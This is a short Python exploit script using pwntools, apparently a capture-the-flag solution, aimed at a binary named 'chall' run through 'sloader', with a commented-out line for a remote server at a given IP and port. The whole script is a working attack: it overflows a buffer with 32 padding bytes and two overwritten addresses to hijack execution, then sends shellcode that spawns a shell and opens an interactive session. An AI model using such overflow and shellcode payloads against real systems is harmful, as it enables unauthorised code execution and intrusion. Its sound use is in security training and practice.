from pwn import *

context.binary = exe = ELF('./chall')

io = process(['./sloader', './chall'])
#gdb.attach(io, api=True)
#io = remote('34.146.195.242', 40001)
payload = b'a'*32 + p64(0x14011a4+0x20) + p64(0x1401182)
io.sendline(payload)

io.sendline(asm(shellcraft.sh()))
io.interactive()